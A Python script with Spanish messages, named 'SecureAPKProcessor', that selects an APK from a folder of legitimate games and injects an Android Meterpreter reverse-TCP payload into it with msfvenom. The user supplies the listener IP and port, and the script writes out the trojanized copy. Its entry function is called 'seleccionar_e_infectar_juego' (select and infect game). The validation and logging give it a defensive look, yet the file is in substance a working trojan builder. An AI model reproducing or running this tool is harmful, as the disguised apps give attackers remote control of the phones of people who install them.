import os
import socket
import subprocess
import logging
import ipaddress
import shutil
from pathlib import Path
from typing import List, Optional, Tuple


class SecureAPKProcessor:
    
    def __init__(self):
        self.setup_logging()
        self.allowed_ports = range(1024, 65536)
        self.default_ports = [8080, 1234, 8081, 9000, 4444, 5555]
        self.max_file_size = 100 * 1024 * 1024  
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('apk_processor.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def validate_ip_address(self, ip: str) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port: str) -> bool:
        try:
            port_num = int(port)
            return port_num in self.allowed_ports
        except ValueError:
            return False
    
    def sanitize_filename(self, filename: str) -> str:
        dangerous_chars = ['/', '\\', '..', '&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '"', "'"]
        sanitized = filename
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '_')
        return sanitized.strip()[:100]
    
    def check_port_availability(self, port: int, host: str = 'localhost') -> bool:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(3)
                result = sock.connect_ex((host, port))
                return result != 0
        except Exception as e:
            self.logger.warning(f"Error verificando puerto {port}: {e}")
            return False
    
    def find_available_port(self) -> Optional[int]:
        for port in self.default_ports:
            if self.check_port_availability(port):
                self.logger.info(f"Puerto disponible encontrado: {port}")
                return port
        
        for port in range(8000, 9000):
            if self.check_port_availability(port):
                self.logger.info(f"Puerto disponible encontrado: {port}")
                return port
        
        return None
    
    def validate_apk_file(self, file_path: str) -> bool:
        try:
            path = Path(file_path)
            
            if not path.exists():
                self.logger.error(f"Archivo no existe: {file_path}")
                return False
            
            if not path.is_file():
                self.logger.error(f"No es un archivo válido: {file_path}")
                return False
            
            if path.suffix.lower() != '.apk':
                self.logger.error(f"No es un archivo APK: {file_path}")
                return False
            
            file_size = path.stat().st_size
            if file_size > self.max_file_size:
                self.logger.error(f"Archivo demasiado grande: {file_size} bytes")
                return False
            
            if file_size == 0:
                self.logger.error(f"Archivo vacío: {file_path}")
                return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error validando archivo APK: {e}")
            return False
    
    def list_apk_files(self, directory: str) -> List[str]:
        try:
            dir_path = Path(directory)
            
            if not dir_path.exists():
                self.logger.warning(f"Directorio no existe: {directory}")
                return []
            
            apk_files = []
            for file_path in dir_path.iterdir():
                if file_path.is_file() and file_path.suffix.lower() == '.apk':
                    if self.validate_apk_file(str(file_path)):
                        apk_files.append(file_path.name)
            
            return sorted(apk_files)
            
        except Exception as e:
            self.logger.error(f"Error listando archivos APK: {e}")
            return []
    
    def secure_input(self, prompt: str, input_type: str = "general") -> Optional[str]:
        max_attempts = 3
        attempts = 0
        
        while attempts < max_attempts:
            try:
                user_input = input(prompt).strip()
                
                if not user_input:
                    print("La entrada no puede estar vacía")
                    attempts += 1
                    continue
                
                if input_type == "ip" and not self.validate_ip_address(user_input):
                    print("Dirección IP inválida")
                    attempts += 1
                    continue
                
                if input_type == "port" and not self.validate_port(user_input):
                    print("Puerto inválido (debe estar entre 1024-65535)")
                    attempts += 1
                    continue
                
                if input_type == "number":
                    try:
                        int(user_input)
                    except ValueError:
                        print("Debe ser un número válido")
                        attempts += 1
                        continue
                
                return user_input
                
            except KeyboardInterrupt:
                print("\nOperación cancelada")
                return None
            except Exception as e:
                self.logger.error(f"Error obteniendo entrada: {e}")
                attempts += 1
        
        print("Máximo número de intentos alcanzado")
        return None
    
    def create_output_directory(self, output_path: str) -> bool:
        try:
            Path(output_path).mkdir(parents=True, exist_ok=True, mode=0o755)
            return True
        except Exception as e:
            self.logger.error(f"Error creando directorio: {e}")
            return False
    
    def execute_msfvenom(self, original_apk: str, ip: str, port: str, output_apk: str) -> bool:
        try:
            if not shutil.which('msfvenom'):
                self.logger.error("msfvenom no está instalado en el sistema")
                print("Error: msfvenom no encontrado. Instale Metasploit Framework")
                return False
            
            command = [
                'msfvenom',
                '-x', original_apk,
                '-p', 'android/meterpreter/reverse_tcp',
                f'LHOST={ip}',
                f'LPORT={port}',
                '-o', output_apk
            ]
            
            self.logger.info(f"Ejecutando: msfvenom con payload para {ip}:{port}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=600,
                check=False
            )
            
            if result.returncode == 0 and os.path.exists(output_apk):
                self.logger.info(f"APK procesado exitosamente: {output_apk}")
                return True
            else:
                self.logger.error(f"Error en msfvenom: {result.stderr}")
                print(f"Error ejecutando msfvenom: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("Timeout ejecutando msfvenom")
            print("Error: Operación expiró por tiempo")
            return False
        except Exception as e:
            self.logger.error(f"Error ejecutando msfvenom: {e}")
            print(f"Error inesperado: {e}")
            return False
    
    def process_apk_selection(self) -> bool:
        try:
            juegos_path = "juegos_legitimos"
            
            if not os.path.exists(juegos_path):
                print(f"Directorio '{juegos_path}' no encontrado")
                self.logger.error(f"Directorio no encontrado: {juegos_path}")
                return False
            
            juegos = self.list_apk_files(juegos_path)
            
            if not juegos:
                print("No hay archivos APK válidos disponibles")
                return False
            
            print("\nArchivos APK disponibles:\n")
            for i, juego in enumerate(juegos, 1):
                file_path = Path(juegos_path) / juego
                size_mb = file_path.stat().st_size / (1024 * 1024)
                print(f" {i}. {juego} ({size_mb:.1f} MB)")
            
            selection = self.secure_input("\nSelecciona un archivo: ", "number")
            if not selection:
                return False
            
            try:
                opcion = int(selection)
                if not (1 <= opcion <= len(juegos)):
                    print("Selección fuera de rango")
                    return False
                juego_seleccionado = juegos[opcion - 1]
            except ValueError:
                print("Selección inválida")
                return False
            
            ip = self.secure_input("Ingresa la IP de destino: ", "ip")
            if not ip:
                return False
            
            print("\nBuscando puerto disponible...")
            puerto_disponible = self.find_available_port()
            
            if puerto_disponible:
                print(f"Puerto sugerido: {puerto_disponible}")
                usar_sugerido = input("¿Usar este puerto? (s/N): ").strip().lower()
                if usar_sugerido == 's':
                    lport = str(puerto_disponible)
                else:
                    lport = self.secure_input("Ingresa puerto manualmente: ", "port")
                    if not lport:
                        return False
            else:
                print("No se encontraron puertos disponibles sugeridos")
                lport = self.secure_input("Ingresa puerto manualmente: ", "port")
                if not lport:
                    return False
            
            ruta_original = os.path.join(juegos_path, juego_seleccionado)
            
            output_dir = "procesados"
            if not self.create_output_directory(output_dir):
                print("Error creando directorio de salida")
                return False
            
            nombre_limpio = self.sanitize_filename(juego_seleccionado.replace('.apk', '_procesado.apk'))
            ruta_salida = os.path.join(output_dir, nombre_limpio)
            
            print(f"\nProcesando archivo con IP: {ip} Puerto: {lport}")
            print("Esto puede tomar varios minutos...")
            
            if self.execute_msfvenom(ruta_original, ip, lport, ruta_salida):
                print(f"\nAPK procesado exitosamente: {ruta_salida}")
                
                file_size = os.path.getsize(ruta_salida) / (1024 * 1024)
                print(f"Tamaño del archivo: {file_size:.1f} MB")
                
                return True
            else:
                print("Error en el procesamiento del APK")
                return False
                
        except KeyboardInterrupt:
            print("\nOperación cancelada por el usuario")
            return False
        except Exception as e:
            self.logger.error(f"Error en procesamiento: {e}")
            print("Error inesperado durante el procesamiento")
            return False


processor = SecureAPKProcessor()


def puerto_disponible(puerto):
    return processor.check_port_availability(puerto)


def seleccionar_e_infectar_juego():
    return processor.process_apk_selection()